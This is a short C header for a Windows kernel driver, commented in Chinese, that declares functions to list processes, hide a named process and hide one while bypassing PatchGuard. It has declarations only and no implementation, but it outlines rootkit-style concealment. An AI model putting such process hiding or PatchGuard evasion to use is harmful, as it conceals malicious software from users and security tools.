#ifndef _ENUM_PROCESS_H_
#define _ENUM_PROCESS_H_


#include <ntddk.h>


// 声明未导出函数
PUCHAR PsGetProcessImageFileName(PEPROCESS pEprocess);


// 遍历进程
BOOLEAN EnumProcess();

// 隐藏指定进程
BOOLEAN HideProcess(PUCHAR pszHideProcessName);

// 隐藏指定进程(Bypass Patch Guard)
BOOLEAN HideProcess_Bypass_PatchGuard(PUCHAR pszHideProcessName);

// 根据不同系统, 获取相应偏移大小
ULONG GetActiveProcessLinksOffset();




#endif